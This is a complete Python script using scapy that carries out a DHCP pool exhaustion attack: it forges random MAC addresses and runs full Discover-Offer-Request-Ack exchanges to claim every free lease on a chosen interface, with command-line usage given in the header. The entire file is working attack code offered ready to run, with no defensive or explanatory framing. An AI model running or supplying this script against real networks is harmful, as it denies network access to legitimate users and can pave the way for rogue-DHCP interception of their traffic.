#!/usr/bin/env python3
"""
DHCP Pool Exhaustion Attack
Grabs every lease in the client-net DHCP pool by spoofing random MACs.
Performs full DORA (Discover → Offer → Request → Ack) per fake client
so leases are actually committed (not just held as pending offers).

Usage (must be root):
    sudo python3 dhcp_exhaustion.py
    sudo python3 dhcp_exhaustion.py --iface enp1s0 --timeout 5 --max 60

Install: sudo apt install python3-scapy
"""

import argparse
import random
import struct
import sys
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    srp1, sendp, conf, RandMAC
)

def rand_mac_bytes():
    """Random unicast MAC as 6-byte bytes (locally administered bit set)."""
    mac = [random.randint(0, 255) for _ in range(6)]
    mac[0] = (mac[0] & 0xfe) | 0x02   # locally administered, unicast
    return bytes(mac)

def mac_str(mac_bytes):
    return ':'.join(f'{b:02x}' for b in mac_bytes)

def dhcp_discover(iface, mac_bytes, xid):
    chaddr = mac_bytes + b'\x00' * 10   # BOOTP chaddr = 16 bytes

    pkt = (
        Ether(src=mac_str(mac_bytes), dst='ff:ff:ff:ff:ff:ff') /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
        DHCP(options=[('message-type', 'discover'), 'end'])
    )
    return pkt

def dhcp_request(iface, mac_bytes, xid, offered_ip, server_ip):
    chaddr = mac_bytes + b'\x00' * 10

    pkt = (
        Ether(src=mac_str(mac_bytes), dst='ff:ff:ff:ff:ff:ff') /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
        DHCP(options=[
            ('message-type', 'request'),
            ('requested_addr', offered_ip),
            ('server_id', server_ip),
            'end'
        ])
    )
    return pkt

def extract_dhcp_option(pkt, option_name):
    if not pkt.haslayer(DHCP):
        return None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == option_name:
            return opt[1]
    return None

def grab_lease(iface, timeout):
    mac_bytes = rand_mac_bytes()
    xid = random.randint(1, 0xFFFFFFFF)

    # Send DISCOVER, wait for OFFER
    discover = dhcp_discover(iface, mac_bytes, xid)
    offer = srp1(discover, iface=iface, timeout=timeout, verbose=False)

    if offer is None:
        return None, 'no_offer'

    msg_type = extract_dhcp_option(offer, 'message-type')
    if msg_type != 2:   # 2 = DHCPOFFER
        return None, f'unexpected_msg_type={msg_type}'

    offered_ip = offer[BOOTP].yiaddr
    server_ip  = extract_dhcp_option(offer, 'server_id')

    if not offered_ip or offered_ip == '0.0.0.0' or not server_ip:
        return None, 'bad_offer'

    # Send REQUEST, wait for ACK
    request = dhcp_request(iface, mac_bytes, xid, offered_ip, server_ip)
    ack = srp1(request, iface=iface, timeout=timeout, verbose=False)

    if ack is None:
        return offered_ip, 'no_ack'

    msg_type = extract_dhcp_option(ack, 'message-type')
    if msg_type == 5:   # 5 = DHCPACK
        return offered_ip, 'leased'
    elif msg_type == 6: # 6 = DHCPNAK
        return offered_ip, 'nak'
    else:
        return offered_ip, f'unexpected_ack_type={msg_type}'


def main():
    parser = argparse.ArgumentParser(description='DHCP pool exhaustion via MAC spoofing')
    parser.add_argument('--iface',   default='enp1s0', help='Network interface (default: enp1s0)')
    parser.add_argument('--timeout', type=int, default=3,  help='Seconds to wait for each server response (default: 3)')
    parser.add_argument('--max',     type=int, default=60, help='Max lease attempts before stopping (default: 60)')
    args = parser.parse_args()

    conf.checkIPaddr = False   # don't filter broadcast replies by src IP

    print(f'[*] DHCP exhaustion on {args.iface} — max {args.max} attempts')
    print(f'[*] Each fake client does full DORA to commit leases\n')

    leased = []

    for i in range(1, args.max + 1):
        ip, status = grab_lease(args.iface, args.timeout)

        if status == 'leased':
            leased.append(ip)
            print(f'  [{i:3d}] LEASED {ip}  (total: {len(leased)})')
        elif status == 'no_offer':
            print(f'  [{i:3d}] NO OFFER')
        else:
            print(f'  [{i:3d}] {status}  (ip={ip})')

    print(f'\n[=] Done. Leases grabbed: {len(leased)}')
    for ip in leased:
        print(f'      {ip}')


if __name__ == '__main__':
    if sys.platform != 'linux':
        print('Linux only (raw sockets need root)')
        sys.exit(1)
    main()
